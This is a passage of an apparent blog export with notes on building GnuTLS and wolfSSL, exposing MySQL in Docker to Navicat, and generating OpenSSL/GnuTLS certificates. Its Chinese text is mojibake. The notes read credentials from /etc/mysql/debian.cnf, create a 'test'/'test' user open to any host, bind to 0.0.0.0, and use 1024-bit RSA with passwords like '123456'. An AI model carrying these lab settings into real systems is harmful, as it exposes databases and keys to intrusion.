class="token comment"># ç¼–è¯‘å åœ¨ src ç›®å½•ä¸‹ å¯ä»¥å¾—åˆ°  gnutls-cli gnutls-cli-debug gnutls-serv å¯æ‰§è¡Œæ–‡ä»¶</span><span class="token comment"># éªŒè¯ç‰ˆæœ¬</span><span class="token variable">$root</span>@380xxx:/xxx/gnutls-3.6.7<span class="token comment"># ./src/gnutls-serv -v</span>gnutls-serv <span class="token number">3.6</span>.7Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2000</span>-2019 Free Software Foundation, and others, all rights reserved.This is <span class="token function">free</span> software. It is licensed <span class="token keyword">for</span> use, modification andredistribution under the terms of the GNU General Public License,version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>Please send bug reports to:  <span class="token operator">&lt;</span>bugs@gnutls.org<span class="token operator">></span><span class="token comment">########################################################################################</span><span class="token comment"># å¦‚æœ å®‰è£…çš„è¯ æ‰§è¡Œ make install</span><span class="token function">make</span> <span class="token function">install</span> <span class="token comment"># ä¼šåœ¨ /usr/local/include/gnutls ç”Ÿæˆå¤´æ–‡ä»¶</span><span class="token comment"># /usr/local/bin/ ä¸‹ ç”Ÿæˆ gnutls-cli gnutls-cli-debug gnutls-serv å¯æ‰§è¡Œæ–‡ä»¶</span><span class="token comment"># éªŒè¯ç‰ˆæœ¬ </span><span class="token variable">$root</span>@380xxx:/xxx/gnutls-3.6.7<span class="token comment"># /usr/local/bin/gnutls-serv -v</span>gnutls-serv <span class="token number">3.6</span>.7Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2000</span>-2019 Free Software Foundation, and others, all rights reserved.This is <span class="token function">free</span> software. It is licensed <span class="token keyword">for</span> use, modification andredistribution under the terms of the GNU General Public License,version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>Please send bug reports to:  <span class="token operator">&lt;</span>bugs@gnutls.org<span class="token operator">></span></code></pre>              </div>            </details></div><h2 id="WolfSSL">WolfSSL</h2><div class="story post-story"><p><a href="https://github.com/wolfSSL/wolfssl">https://github.com/wolfSSL/wolfssl</a></p><p><a href="https://www.wolfssl.com/">https://www.wolfssl.com/</a></p><h3 id="ä¸‹è½½æºç ">ä¸‹è½½æºç </h3><pre class="language-bash" data-language="bash"><code class="language-bash">https://www.wolfssl.com/download/<span class="token comment">#  æ‰‹åŠ¨ä¸‹è½½</span></code></pre><h3 id="ç¼–è¯‘å®‰è£…-3">ç¼–è¯‘å®‰è£…</h3><pre class="language-bash" data-language="bash"><code class="language-bash">./configure<span class="token comment">#./configure --help ./configure  --enable-psk --enable-pwdbased --enable-rsa --enable-sha --enable-debug --disable-dh --disable-ecc C_EXTRA_FLAGS=-DWOLFSSL_STATIC_PSK </span></code></pre><p>ç»“æœ</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">Configuration summary <span class="token keyword">for</span> wolfssl version <span class="token number">4.7</span>.0   * Installation prefix:        /usr/local   * System type:                pc-linux-gnu   * Host CPU:                   x86_64   * C Compiler:                 gcc   * C Flags:                     -DWOLFSSL_STATIC_PSK  -g -ggdb -O0 -Wno-pragmas -Wall -Wno-strict-aliasing -Wextra -Wunknown-pragmas --param<span class="token operator">=</span>ssp-buffer-size<span class="token operator">=</span><span class="token number">1</span> -Waddress -Warray-bounds -Wbad-function-cast -Wchar-subscripts -Wcomment -Wfloat-equal -Wformat-security -Wformat<span class="token operator">=</span><span class="token number">2</span> -Wmaybe-uninitialized -Wmissing-field-initializers -Wmissing-noreturn -Wmissing-prototypes -Wnested-externs -Wnormalized<span class="token operator">=</span>id -Woverride-init -Wpointer-arith -Wpointer-sign -Wredundant-decls -Wshadow -Wsign-compare -Wstrict-overflow<span class="token operator">=</span><span class="token number">1</span> -Wswitch-enum -Wundef -Wunused -Wunused-result -Wunused-variable -Wwrite-strings -fwrapv   * C++ Compiler:   * C++ Flags:   * CPP Flags:   * CCAS Flags:                  -DWOLFSSL_STATIC_PSK   * LIB Flags:                   -pie -z relro -z now   * Debug enabled:              <span class="token function">yes</span>   * Coverage enabled:   * Warnings as failure:        no   * <span class="token function">make</span> -j:                    <span class="token number">9</span>   * VCS checkout:               no   Features   * FIPS:                       no   * Single threaded:            no   * Filesystem:                 <span class="token function">yes</span>   * OpenSSH Build:              no   * OpenSSL Extra API:          no   * OpenSSL Coexist:            no   * Old Names:                  <span class="token function">yes</span>   * Max Strength Build:         no   * Distro Build:               no   * Reproducible Build:         no   * fastmath:                   <span class="token function">yes</span>   * Assembly Allowed:           <span class="token function">yes</span>   * sniffer:                    no   * snifftest:                  no   * ARC4:                       no   * AES:                        <span class="token function">yes</span>   * AES-NI:                     no   * AES-CBC:                    <span class="token function">yes</span>   * AES-GCM:                    <span class="token function">yes</span>   * AES-CCM:                    no   * AES-CTR:                    no   * AES-CFB:                    no   * AES-OFB:                    no   * DES3:                       no   * IDEA:                       no   * Camellia:                   no   * NULL Cipher:                no   * MD2:                        no   * MD4:                        no   * MD5:                        <span class="token function">yes</span>   * RIPEMD:                     no   * SHA:                        <span class="token function">yes</span>   * SHA-224:                    <span class="token function">yes</span>   * SHA-384:                    <span class="token function">yes</span>   * SHA-512:                    <span class="token function">yes</span>   * SHA3:                       <span class="token function">yes</span>   * SHAKE256:                   <span class="token function">yes</span>   * BLAKE2:                     no   * BLAKE2S:                    no   * CMAC:                       no   * keygen:                     no   * certgen:                    no   * certreq:                    no   * certext:                    no   * certgencache:               no   * HC-128:                     no   * RABBIT:                     no   * CHACHA:                     <span class="token function">yes</span>   * XCHACHA:                    no   * Hash DRBG:                  <span class="token function">yes</span>   * PWDBASED:                   <span class="token function">yes</span>   * scrypt:                     no   * wolfCrypt Only:             no   * HKDF:                       <span class="token function">yes</span>   * X9.63 KDF:                  no   * MD4:                        no   * PSK:                        <span class="token function">yes</span>   * Poly1305:                   <span class="token function">yes</span>   * LEANPSK:                    no   * LEANTLS:                    no   * RSA:                        <span class="token function">yes</span>   * RSA-PSS:                    <span class="token function">yes</span>   * DSA:                        no   * DH:                         no   * DH Default Parameters:      <span class="token function">yes</span>   * ECC:                        no   * ECC Custom Curves           no   * ECC Minimum Bits            <span class="token number">224</span>   * CURVE25519:                 no   * ED25519:                    no   * CURVE448:                   no   * ED448:                      no   * FPECC:                      no   * ECC_ENCRYPT:                no   * ASN:                        <span class="token function">yes</span>   * Anonymous cipher:           no   * CODING:                     <span class="token function">yes</span>   * MEMORY:                     <span class="token function">yes</span>   * I/O POOL:                   no   * LIGHTY:                     no   * HAPROXY:                    no   * STUNNEL:                    no   * Apache httpd:               no   * NGINX:                      no   * ASIO:                       no   * LIBWEBSOCKETS:              no   * Qt                          no   * Qt Unit Testing             no   * SIGNAL:                     no   * ERROR_STRINGS:              <span class="token function">yes</span>   * DTLS:                       no   * SCTP:                       no   * Indefinite Length:          no   * Multicast:                  no   * SSL v3.0 <span class="token punctuation">(</span>Old<span class="token punctuation">)</span>:             no   * TLS v1.0 <span class="token punctuation">(</span>Old<span class="token punctuation">)</span>:             no   * TLS v1.1 <span class="token punctuation">(</span>Old<span class="token punctuation">)</span>:             <span class="token function">yes</span>   * TLS v1.2:                   <span class="token function">yes</span>   * TLS v1.3:                   <span class="token function">yes</span>   * Post-handshake Auth:        no   * Early Data:                 no   * Send State <span class="token keyword">in</span> HRR Cookie:   no   * OCSP:                       no   * OCSP Stapling:              no   * OCSP Stapling v2:           no   * CRL:                        no   * CRL-MONITOR:                no   * Persistent session cache:   no   * Persistent cert    cache:   no   * Atomic User Record Layer:   no   * Public Key Callbacks:       no   * NTRU:                       no   * QSH:                        no   * Whitewood netRandom:        no   * Server Name Indication:     no   * ALPN:                       no   * Maximum Fragment Length:    no   * Trusted CA Indication:      no   * Truncated HMAC:             no   * Supported Elliptic Curves:  no   * FFDHE only <span class="token keyword">in</span> client:       no   * Session Ticket:             no   * Extended Master Secret:     <span class="token function">yes</span>   * Renegotiation Indication:   no   * Secure Renegotiation:       no   * Fallback SCSV:              no   * Keying Material Exporter:   no   * All TLS Extensions:         no   * PKCS<span class="token comment">#7                      no</span>   * S/MIME                      no   * wolfSSH                     no   * wolfTPM                     no   * wolfSCEP                    no   * Secure Remote Password      no   * Small Stack:                no   * Linux Kernel Module:        no   * valgrind unit tests:        no   * LIBZ:                       no   * Examples:                   <span class="token function">yes</span>   * Crypt tests:                <span class="token function">yes</span>   * Stack sizes <span class="token keyword">in</span> tests:       no   * Heap stats <span class="token keyword">in</span> tests:        no   * User Crypto:                no   * Fast RSA:                   no   * Single Precision:           no   * SP math implementation:     no   * Async Crypto:               no   * PKCS<span class="token comment">#11:                    no</span>   * PKCS<span class="token comment">#12:                    yes</span>   * Cavium Nitrox:              no   * Cavium Octeon <span class="token punctuation">(</span>Sync<span class="token punctuation">)</span>:       no   * Intel Quick Assist:         no   * ARM ASM:                    no   * AES Key Wrap:               no   * Write duplicate:            no   * Xilinx Hardware Acc.:       no   * Inline Code:                <span class="token function">yes</span>   * Linux AF_ALG:               no   * Linux devcrypto:            no   * Crypto callbacks:           no</code></pre>              </div>            </details><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span class="token comment"># å¦‚æœé‡åˆ°é”™è¯¯ 'aclocal-1.15' is missing on your systemâ€</span><span class="token comment"># å…ˆæ‰§è¡Œautoreconf -f -i  åœ¨æ‰§è¡Œ ./configure  åœ¨ make</span><span class="token comment">## å®‰è£… å¦‚ä¸Š</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># To test the build, run the testsuite program from the root wolfSSL directory:</span>./testsuite/testsuite.test<span class="token comment"># or use autoconf to run the testsuite as well as the standard wolfSSL API and crypto tests:</span><span class="token function">make</span> <span class="token builtin class-name">test</span><span class="token comment">############################</span><span class="token comment"># å¦‚æœæ²¡æœ‰configure  ä½¿ç”¨ cmake</span><span class="token comment"># å®‰è£… cmake</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> cmake<span class="token comment"># Usage:</span><span class="token function">mkdir</span> build <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> buildcmake <span class="token punctuation">..</span>cmake --build <span class="token builtin class-name">.</span></code></pre>              </div>            </details><h3 id="ç»“æœè¿è¡Œ">ç»“æœè¿è¡Œ</h3><p>åœ¨<code>æ ¹ç›®å½•ä¸‹/exaples/</code> ä¸­ æœ‰ <code>server</code> å’Œ <code>client</code></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç¬”è®° </category>
          
          <category> SSL </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> ç¬”è®° </tag>
            
            <tag> GnuTLS </tag>
            
            <tag> OpenSSL </tag>
            
            <tag> WolfSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¬åœ°Navicatè¿æ¥æœ¬åœ°dockerå®¹å™¨ä¸­mysql</title>
      <link href="/posts/35862d23/"/>
      <url>/posts/35862d23/</url>
      
        <content type="html"><![CDATA[<h1>æœ¬åœ°navicatè¿æ¥æœ¬åœ°dockerå®¹å™¨ä¸­mysql</h1><blockquote><p>ğŸ˜„ @Auther by sizaif</p><p>ğŸ“† 2021-06-24  17:54:18</p></blockquote><p>[TOC]</p><h2 id="ä¿®è®¢å†å²">ä¿®è®¢å†å²</h2><div class="story post-story"><ul><li>2021-06-24  17:54:31: é¦–æ¬¡ç¼–è¾‘</li><li>2021-06-24  22:28:18: update bug</li></ul></div><h2 id="å…·ä½“æ­¥éª¤">å…·ä½“æ­¥éª¤</h2><div class="story post-story"><p>å¦‚æœå·²ç»æœ‰äº†mysqlé•œåƒ, ç›´æ¥è·³è¿‡,åˆ°docker mysqlå®¹å™¨ä¸­</p><h3 id="docker-æ‹‰å»-mysql-é•œåƒ">docker æ‹‰å» mysql é•œåƒ</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker pull mysql  </code></pre><h3 id="å¯åŠ¨MySQLé•œåƒ">å¯åŠ¨MySQLé•œåƒ</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker run --name<span class="token operator">=</span>mysql -itd -p <span class="token operator">&lt;</span>å®¿ä¸»æœºæ˜ å°„ç«¯å£<span class="token operator">></span>:3306 -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token operator">&lt;</span>å¯†ç <span class="token operator">></span> mysql  </code></pre><h3 id="è¿›å…¥MySQLå®¹å™¨">è¿›å…¥MySQLå®¹å™¨</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker <span class="token builtin class-name">exec</span> -it mysql /bin/bash</code></pre><h3 id="è¿›å…¥MySQL">è¿›å…¥MySQL</h3><p><strong>è®¾ç½®å…è®¸å¤–éƒ¨ç™»å½•çš„mysqlç”¨æˆ·</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ mysql -uroot -p<span class="token operator">&lt;</span>å¯†ç <span class="token operator">></span><span class="token comment"># è®¾ç½®å…è®¸å¤–éƒ¨ç™»å½•çš„mysqlç”¨æˆ·: 'test' hostç›‘å¬åœ°å€:'%' å¯†ç  test</span>$ mysql<span class="token operator">></span> CREATE <span class="token environment constant">USER</span> If Not Exists <span class="token string">'test'</span>@<span class="token string">'%'</span> IDENTIFIED WITH mysql_native_password BY <span class="token string">'test'</span><span class="token punctuation">;</span><span class="token comment"># èµ‹äºˆç”¨æˆ·æƒé™</span>$ mysql<span class="token operator">></span> GRANT all privileges ON test.* TO <span class="token string">'test'</span>@<span class="token string">'%'</span> identified by <span class="token string">'test'</span><span class="token punctuation">;</span><span class="token comment"># åˆ·æ–°</span>$ mysql<span class="token operator">></span>flush privileges<span class="token punctuation">;</span></code></pre><p><strong>ä¿®æ”¹mysqlé…ç½®ï¼Œå…è®¸ä»»æ„ä¸»æœºè®¿é—®</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¿®æ”¹ mysqld.cnfä¸­ bind-addressç›‘å¬åœ°å€loaclhstä¸º0.0.0.0</span>$ <span class="token function">sed</span> -i <span class="token string">'s/^bind-address.*$/bind-address=0.0.0.0/'</span> /etc/mysql/mysql.conf.d/mysqld.cnf<span class="token comment"># é‡å¯mysql</span>$ <span class="token function">service</span> mysql restart</code></pre><p>è‹¥å«Œè¿›å…¥mysqlå¤ªéº»çƒ¦ç›´æ¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤,æ›¿æ¢æ‰<code>&lt;&gt;</code>ä¸­å†…å®¹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#ä¿®æ”¹mysqlé…ç½®ï¼Œå…è®¸ä»»æ„ä¸»æœºè®¿é—®</span>$ <span class="token function">sed</span> -i <span class="token string">'s/^bind-address.*$/bind-address=0.0.0.0/'</span> /etc/mysql/mysql.conf.d/mysqld.cnf$ <span class="token function">service</span> mysql restart<span class="token comment"># æ–°å»ºå…è®¸å¤–éƒ¨ç™»å½•çš„mysqlç”¨æˆ·ï¼š'&lt;test>'@'%'ï¼Œå¯†ç &lt;test></span><span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/mysql/debian.cnf <span class="token operator">|</span><span class="token function">grep</span> user<span class="token operator">|</span><span class="token function">head</span> -1<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $3&#125;'</span><span class="token variable">`</span></span><span class="token assign-left variable">PW</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/mysql/debian.cnf <span class="token operator">|</span><span class="token function">grep</span> password<span class="token operator">|</span><span class="token function">head</span> -1<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $3&#125;'</span><span class="token variable">`</span></span>mysql -u<span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> -p<span class="token variable">$&#123;PW&#125;</span> -e<span class="token string">"CREATE USER If Not Exists '&lt;test>'@'%' IDENTIFIED WITH mysql_native_password BY '&lt;test>';"</span>mysql -u<span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> -p<span class="token variable">$&#123;PW&#125;</span> -e<span class="token string">"GRANT all privileges ON &lt;your mysql continer name>.* TO '&lt;test>'@'%' identified by '&lt;test>';flush privileges;"</span></code></pre><h3 id="navicat-è¿œç¨‹è¿æ¥">navicat è¿œç¨‹è¿æ¥</h3><p>ç„¶åè¿œç¨‹è¿æ¥ã€<strong>å®¿ä¸»æœºip</strong>:<strong>&lt;å®¿ä¸»æœºæ˜ å°„ç«¯å£&gt;</strong>ã€‘ï¼Œä½¿ç”¨æ–°å»ºçš„ç”¨æˆ·ç™»å½•mysqlå³å¯ã€‚</p><blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>$ docker run --name<span class="token operator">=</span>mysql -itd -p <span class="token operator">&lt;</span>å®¿ä¸»æœºæ˜ å°„ç«¯å£<span class="token operator">></span>:3306 -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token operator">&lt;</span>å¯†ç <span class="token operator">></span> mysql  </code></pre></blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210624181631.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210624181631.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210624181630341"></p></div><h2 id="é—®é¢˜å‘ç°æ•´ç†">é—®é¢˜å‘ç°æ•´ç†</h2><div class="story post-story"><ol><li><p><font color='red'>æŠ¥2013é”™è¯¯</font></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210624181916.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210624181916.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210624181915547"></p><p>è¿™ä¸ªåŸå› ä¸€èˆ¬æ˜¯ç”±mysqlä¸­å·²ç»è®¾å®šç”¨æˆ·çš„è¿œç¨‹hostä¸ºâ€™%',ä½†æ˜¯mysqld.cnf æˆ– my.cnfä¸­ <code>bind-address </code>ç›‘å¬åœ°å€ä¸º<code>localhost</code>å¯¼è‡´</p></li><li><p><font color='red'>æŠ¥1045é”™è¯¯ Access defined</font></p><p>ä¸€èˆ¬æ˜¯ç”±äºå¯†ç ä¸æ­£ç¡®æˆ–ç”¨æˆ·ä¸æ­£ç¡®å¯¼è‡´</p></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> æ•™ç¨‹ </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”ŸæˆOpenssl &amp;&amp; Gnutls  Keys</title>
      <link href="/posts/bb0d4a87/"/>
      <url>/posts/bb0d4a87/</url>
      
        <content type="html"><![CDATA[<h1>ç”Ÿæˆopenssl &amp;&amp; gnutls  keys</h1><blockquote><p>ğŸ˜„ @by sizaif</p><p>ğŸ“† 2021-05-17  20:36:00</p></blockquote><p>[TOC]</p><h2 id="Openssl">Openssl</h2><div class="story post-story"><details green><summary> ä»£ç  </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Generate DH parameters</span>openssl dhparam -outform PEM -out dhparams.pem -5 <span class="token number">2048</span><span class="token comment"># Generate CA key and certificate CA.pl or CA.sh</span>/usr/lib/ssl/misc/CA.pl -newca<span class="token comment"># Generate server key and certificate</span>openssl req -newkey rsa:1024 -nodes -keyout server.key -out server.reqopenssl ca -out server.crt -infiles server.req<span class="token comment"># Generate client key and certificate</span>openssl req -newkey rsa:1024 -nodes -keyout client.key -out client.reqopenssl ca -out client.crt -infiles client.req<span class="token comment"># Generate client DH key and certificate</span>openssl genpkey -paramfile dhparams.pem -out client_dh.keyopenssl pkey -in client_dh.key -pubout -out client_dh.pub<span class="token comment">#~/SSL/openssl/openssl-1.0.2/apps/openssl x509 -req -in client.req -CAkey demoCA/private/cakey.pem -CA demoCA/cacert.pem -force_pubkey client_dh.pub -out client_dh.crt -CAcreateserial -extensions v3_req -extfile ./openssl.cnf</span><span class="token comment"># Get keys in Java keystore</span><span class="token comment"># è¿™é‡Œè®¾ç½®æœåŠ¡ç«¯ çš„åç§°ä¸º server  å¯†ç ä¸º changeit</span>openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -name server -CAfile ca.crt -caname rootkeytool -importkeystore -deststorepass changeit -destkeypass changeit -destkeystore keystore -srckeystore server.p12 -srcstoretype PKCS12 -srcstorepass changeit -alias server<span class="token comment"># è¿™é‡Œè®¾ç½®å®¢æˆ·ç«¯ çš„åç§°ä¸º client  å¯†ç ä¸º changeit</span>openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12 -name client -CAfile ca.crt -caname rootkeytool -importkeystore -srckeystore client.p12 -destkeystore keystore -srcstoretype PKCS12  -srcstorepass changeit -deststorepass changeit -destkeypass changeit  -alias client<span class="token comment">#openssl pkcs12 -export -in client_dh.crt -inkey client_dh.key -out client_dh.p12 -name clientdh -CAfile ca.crt -caname root</span><span class="token comment">#keytool -importkeystore -deststorepass changeit -destkeypass changeit -destkeystore keystore -srckeystore client_dh.p12 -srcstoretype PKCS12 -srcstorepass changeit -alias clientdh</span><span class="token comment"># Get keys in Netscape keystore</span>certutil -N -d <span class="token builtin class-name">.</span>certutil -A -n ca -i demoCA/cacert.pem -d <span class="token builtin class-name">.</span> -t TCcertutil -A -n server -i server.crt -d <span class="token builtin class-name">.</span> -t Ppk12util -d <span class="token builtin class-name">.</span> -i server.p12certutil -A -n client1 -i client.crt -d <span class="token builtin class-name">.</span> -t Ppk12util -d <span class="token builtin class-name">.</span> -i client.p12</code></pre>              </div>            </details></div><h2 id="GnuTLS">GnuTLS</h2><div class="story post-story"><details blue><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#ç”ŸæˆCAç§é’¥</span>certtool --generate-privkey <span class="token operator">></span> x509-ca-key.pem<span class="token comment"># åˆ›å»ºCAæ¨¡ç‰ˆ</span><span class="token function">vim</span> ca.tmplcn <span class="token operator">=</span> <span class="token string">"GnuTLS test CA"</span>organization <span class="token operator">=</span> <span class="token string">"TLSTest"</span>serial <span class="token operator">=</span> <span class="token number">1</span>expiration_days <span class="token operator">=</span> <span class="token number">3650</span>casigning_keycert_signing_keycrl_signing_key<span class="token comment">#ç”ŸæˆCAè¯ä¹¦</span>certtool --generate-self-signed --load-privkey x509-ca-key.pem --template ca.tmpl --outfile x509-ca.pem<span class="token comment">#ç”ŸæˆServerç§é’¥</span>certtool --generate-privkey <span class="token operator">></span> x509-server-key.pem<span class="token comment">#åˆ›å»ºServerè¯ä¹¦æ¨¡ç‰ˆ</span><span class="token function">vim</span> server.tmplcn <span class="token operator">=</span> <span class="token string">"GnuTLS test server"</span> organization <span class="token operator">=</span> <span class="token string">"TLSTest"</span> expiration_days <span class="token operator">=</span> <span class="token number">3650</span>signing_key encryption_keytls_www_server<span class="token comment">#ç”ŸæˆServerè¯ä¹¦</span>certtool --generate-certificate --load-privkey x509-server-key.pem <span class="token punctuation">\</span>  --load-ca-certificate x509-ca.pem --load-ca-privkey x509-ca-key.pem <span class="token punctuation">\</span>  --template server.tmpl --outfile x509-server.pem  <span class="token comment">#ç”ŸæˆClientç§é’¥</span>certtool --generate-privkey <span class="token operator">></span> x509-client-key.pem<span class="token comment">#åˆ›å»ºClientè¯ä¹¦æ¨¡ç‰ˆ</span><span class="token function">vim</span> client.tmplcn <span class="token operator">=</span> GnuTLS <span class="token builtin class-name">test</span> client    tls_www_clientencryption_keysigning_key  tls_www_client<span class="token comment">#ç”ŸæˆClientè¯ä¹¦</span>certtool --generate-certificate --load-privkey x509-client-key.pem <span class="token punctuation">\</span>  --load-ca-certificate x509-ca.pem --load-ca-privkey x509-ca-key.pem <span class="token punctuation">\</span>  --template client.tmpl --outfile x509-client.pem  <span class="token comment">#è½¬æ¢ä¸ºp12è¯ä¹¦ ä»¥åŠjava keystore ;Get keys in Java keystore</span><span class="token comment"># è¿™é‡Œè®¾ç½®çš„åç§°ä¸º client</span><span class="token comment"># å¯†ç ä¸º123456</span>certtool --to-p12 --load-ca-certificate x509-ca.pem <span class="token punctuation">\</span>  --load-privkey x509-client-key.pem --load-certificate x509-client.pem <span class="token punctuation">\</span>  --outder --outfile x509-client.p12keytool -importkeystore -srckeystore x509-client.p12 -destkeystore keystore -srcstoretype PKCS12 -srcstorepass <span class="token number">123456</span> -deststorepass <span class="token number">123456</span>  -alias client<span class="token comment"># è¿™é‡Œè®¾ç½®çš„åç§°ä¸º server </span><span class="token comment"># å¯†ç ä¸º123456</span>certtool --to-p12 --load-ca-certificate x509-ca.pem <span class="token punctuation">\</span>  --load-privkey x509-server-key.pem --load-certificate x509-server.pem <span class="token punctuation">\</span>  --outder --outfile x509-server.p12keytool -importkeystore -srckeystore x509-server.p12 -destkeystore keystore -srcstoretype PKCS12 -srcstorepass <span class="token number">123456</span> -deststorepass <span class="token number">123456</span>  -alias server</code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç¬”è®° </category>
          
          <category> SSL </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> ç¬”è®° </tag>
            
            <tag> GnuTLS </tag>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ä»£ç†è¿›è¡Œ Docker Build é—®é¢˜çš„è§£å†³æ€è·¯</title>
      <link href="/posts/d4ac1b81/"/>
      <url>/posts/d4ac1b81/</url>
      
        <content type="html"><![CDATA[<h1>ä½¿ç”¨ä»£ç†è¿›è¡Œ docker build é—®é¢˜çš„è§£å†³æ€è·¯</h1><blockquote><p>ğŸ˜„ @Auther: sizaif</p><p>ğŸ“† 2021-06-10  00:03:14</p><p>ğŸ” è½¬è½½è‡³:</p><p>åŸæ–‡ä½œè€…: <a href="http://www.simpleapples.com/">simpleapples</a></p><p>åŸæ–‡é“¾æ¥: <a href="http://www.simpleapples.com/2019/04/18/building-docker-image-behind-proxy/">http://www.simpleapples.com/2019/04/18/building-docker-image-behind-proxy/</a></p><p>è®¸å¯åè®®: <a href="http://creativecommons.org/licenses/by-nc/4.0/">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨ 4.0 å›½é™…è®¸å¯åè®®</a></p></blockquote><p>[TOC]</p><h3 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h3><p>åœ¨ä½¿ç”¨ docker build æ‰“åŒ…é•œåƒæ—¶ï¼Œé‡åˆ°äº†éœ€è¦ä½¿ç”¨ä»£ç†è®¿é—®ç½‘ç»œçš„éœ€æ±‚ã€‚ä½¿ç”¨å¦‚ä¸‹çš„ Dockerfile æ¥æ¨¡æ‹Ÿè¿™ä¸ªåœºæ™¯ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM golang:1.12RUN <span class="token function">curl</span> www.google.com --max-time <span class="token number">3</span></code></pre><p>å›½å†…ä¸€èˆ¬ç½‘ç»œç¯å¢ƒä¸‹ï¼Œcurl <a href="http://www.google.com/">www.google.com</a> æ˜¯æ— æ³•æ­£å¸¸è¿”å›çš„ï¼ŒåŠ å…¥ â€“max-time è®© curl çš„è€—æ—¶ä¸è¦å¤ªé•¿ã€‚</p><h3 id="é…ç½®-http-proxy-å˜é‡">é…ç½® http_proxy å˜é‡</h3><p>é¦–å…ˆéœ€è¦åœ¨ç¯å¢ƒå˜é‡ä¸­è®¾ç½® http_proxy å’Œ https_proxyï¼Œä½¿å¾—è®¿é—®ç½‘ç»œçš„å‘½ä»¤ï¼ˆè¿™é‡Œä½¿ç”¨ curl æ¥ä»£è¡¨ï¼‰èƒ½å¤Ÿé€šè¿‡ç¯å¢ƒå˜é‡ä¸­é…ç½®çš„ä»£ç†æœåŠ¡å™¨è®¿é—® <a href="http://www.google.com./">www.google.comã€‚</a></p><p><code>docker build </code>å‘½ä»¤è™½ç„¶æ˜¯åœ¨<code> docker</code> æ‰€åœ¨çš„å®¿ä¸»æœºä¸Šæ‰§è¡Œçš„ï¼Œçœ‹ä¸Šå»åƒæ˜¯ç›´æ¥ä½¿ç”¨äº†å®¿ä¸»æœºçš„ç½‘ç»œç¯å¢ƒï¼Œä½†å®é™…ä¸Š<code>docker build </code>ä¹Ÿæ˜¯å¯åŠ¨äº†ä¸€ä¸ª<code>container</code>è¿›è¡Œæ„å»ºï¼Œæ‰€ä»¥åœ¨æ„å»ºè¿‡ç¨‹ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½æ˜¯åœ¨ <code>container </code>ä¸­æ‰§è¡Œçš„ï¼Œ<code>http_proxy</code> å’Œ<code> https_proxy</code> çš„é…ç½®ä¹Ÿåº”è¯¥æ˜¯åœ¨<code> container</code> ä¸­è¿›è¡Œçš„ã€‚å¯ä»¥ä½¿ç”¨ ENV æ¥é…ç½® <code>container</code> ä¸­çš„ç¯å¢ƒå˜é‡ã€‚</p><p>ä»£ç†æœåŠ¡å™¨å¯åŠ¨åœ¨å®¿ä¸»æœºçš„ 1087 